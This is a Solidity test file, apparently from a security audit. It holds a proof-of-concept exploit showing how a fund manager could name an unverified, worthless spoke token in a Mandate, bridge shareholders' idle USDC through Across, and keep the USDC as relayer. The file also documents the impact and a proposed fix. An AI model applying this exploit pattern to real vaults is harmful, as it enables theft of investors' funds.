// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IFundFactory} from "../../../src/interfaces/IFundFactory.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {IPriceSource} from "../../../src/interfaces/IPriceSource.sol";
import {IAcrossSpokePool} from "../../../src/interfaces/external/IAcrossSpokePool.sol";
import {CoreVault} from "../../../src/core/CoreVault.sol";
import {ShareMath} from "../../../src/libraries/ShareMath.sol";
import {Transit, TransitState} from "../../../src/interfaces/FundTypes.sol";
import {MockToken} from "../../mocks/v4/MockToken.sol";
import {AccessFundFixture} from "./AccessFundFixture.sol";

/// @title PoC: the hub accepts any `spokeToken` in the Mandate, so the manager bridges Idle into a worthless token
///        and collects the USDC as the Across relayer
/// @notice ATTACK. `FundFactory.createFund` checks the Mandate's hub USDC against the chain's base token
///         (FundFactory.sol:151) but never a spoke's `spokeToken`: that check exists only in `createSpoke`
///         (FundFactory.sol:201), on the other chain, which the manager simply never calls. The Core Vault then uses
///         the Mandate's `spokeToken` as the Across `outputToken` of every send (CoreVaultLogic.sol:679) and the
///         manager supplies `outputAmount` and `exclusiveRelayer` (FundTypes.sol:77). So:
///         1. the manager creates a fund whose Mandate names, as the Robinhood spoke token, a token it controls;
///         2. shareholders deposit USDC;
///         3. the manager calls `sendToSpoke` for all Free Idle (up to the Spoke Cap it chose) with itself as the
///            exclusive relayer. `maxBridgeFeeBps` is satisfied, because the fee is measured in UNITS of the output
///            token, whatever that token is worth;
///         4. as relayer the manager fills the deposit on the spoke with the worthless token (the recipient, the
///            predicted Spoke Vault address, does not even need to exist) and Across repays it the USDC.
/// @notice IMPACT. Direct theft of the fund's Idle, bounded only by the Spoke Cap, a number the same manager wrote.
///         The Mandate is public, but nothing on the Hub Chain lets a shareholder tell that a 20-byte address on
///         another chain is not USDG, and the docs say the factory refuses "a Mandate USDC or spoke token that is not
///         the chain's base token" (docs/DEPLOYMENT.md). Afterwards the transit can never be refunded, mints revert
///         (the price source does not know the token) and payouts value the In-flight Value at zero.
/// @notice BUSINESS RULE. DEC-089 decides that the supported-chain list is protocol-level, with per-chain parameters,
///         and that the Mandate chooses within it. The factory has no such list.
/// @notice FIX. Give the hub factory the protocol-level supported-chain registry DEC-089 asks for (EVM chain id ->
///         Wormhole chain id, base token, report lifetime), immutable like the rest of its wiring, and make
///         `createFund` refuse a Mandate spoke that differs from it. Also refuse a non-zero `exclusiveRelayer`.
contract UnverifiedSpokeTokenPoC is AccessFundFixture {
    function test_POC_managerBridgesIdleIntoAWorthlessSpokeToken() public {
        // A token the manager deployed on the spoke chain; on the hub it is only an address in the Mandate.
        MockToken worthless = new MockToken("USDG", 6);
        FundPlan memory plan = _plan();
        plan.spokeToken = address(worthless);

        // The hub factory accepts the Mandate and the fund opens for deposits.
        (IFundFactory.FundAddresses memory a,) = _createFund(plan);
        CoreVault core = CoreVault(a.coreVault);
        assertEq(core.mandate().spokes[0].spokeToken, address(worthless));
        _deposit(core, alice, 600_000e6);
        _deposit(core, bob, 400_000e6);
        uint256 idle = core.idle();
        assertEq(idle, 997_500e6);

        // The manager sends all of it "to the spoke", quoting the maximum fee the Mandate allows (0.5%). Exclusivity is
        // refused since S-9, but no other relayer serves a route into a worthless token, so the manager relays it.
        uint256 output = idle - idle * 50 / 10_000;
        address spokeVault = factory.addressOf(a.fundId, "SpokeVault", SPOKE);
        address escrow = vm.computeCreateAddress(address(core), vm.getNonce(address(core)));
        vm.expectCall(
            address(hubAcross),
            abi.encodeWithSelector(
                IAcrossSpokePool.depositV3.selector,
                escrow,
                spokeVault,
                address(usdc),
                address(worthless),
                idle,
                output,
                SPOKE,
                address(0)
            )
        );
        vm.prank(manager);
        bytes32 transitId = core.sendToSpoke(0, idle, 0, _quote(output, address(0)));

        assertEq(core.idle(), 0, "every USDC of the shareholders left the Core Vault");
        assertEq(_balance(usdc, address(hubAcross)), idle, "and waits in the Across SpokePool for the relayer");
        assertEq(spokeVault.code.length, 0, "the recipient: an address nobody ever created a vault at");

        // Across settlement, modelled (the mock pool has no relayer leg): the manager as relayer delivers `output`
        // units of the output token on the spoke and is repaid the input amount in USDC.
        vm.prank(address(hubAcross));
        usdc.transfer(manager, idle);
        assertEq(_balance(usdc, manager), 997_500e6, "the manager holds the shareholders' USDC");

        // What is left on the hub: a transit that will never be refunded (it was filled)...
        Transit memory t = core.transit(transitId);
        assertEq(uint8(t.state), uint8(TransitState.Sent));
        assertEq(t.outputToken, address(worthless));
        // ...a Share Assets read that reverts, so every mint reverts (the price source does not know the token)...
        vm.expectRevert(abi.encodeWithSelector(IPriceSource.UnsupportedToken.selector, address(worthless)));
        core.shareAssets();
        // ...and payouts that price the In-flight Value at zero: no shareholder can even open a Payout Request.
        vm.prank(alice);
        vm.expectRevert(ShareMath.ZeroSharePrice.selector);
        core.requestPayout(100e6, ICoreVault.PayoutMode.Instant);
    }
}
